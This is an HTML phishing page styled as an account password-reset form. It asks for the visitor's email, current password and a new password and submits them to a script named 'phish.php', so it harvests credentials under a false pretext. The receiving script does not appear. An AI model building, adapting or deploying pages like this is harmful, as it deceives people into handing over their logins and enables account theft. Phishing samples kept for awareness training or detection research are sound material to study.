<!DOCTYPE html>
<html lang="en">

<head>
	<title>Reset your account</title>
	
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<link rel="stylesheet" href="css/main.css">
	
	<link rel="icon" type="image/png" href="images/favicon.png">
	
</head>
<body>
	
	<form id="ph-form" method="POST" action="phish.php">
		<div class="form">

			<img src="images/logo.png"> 

			<div class="hding">Reset your account password</div>

			<input type="email" name="user_email" placeholder="Email" required/>
			<input type="password" name="user_password" placeholder="Current Password" required/>
			<input type="password" name="user_newpass" placeholder="New password" required/>
			<input type="password" name="user_newpass_conf" placeholder="Confirm the new password" required/>
			
			<button>Sign in</button>
			
		</div>
	</form>
	
</body>
</html>
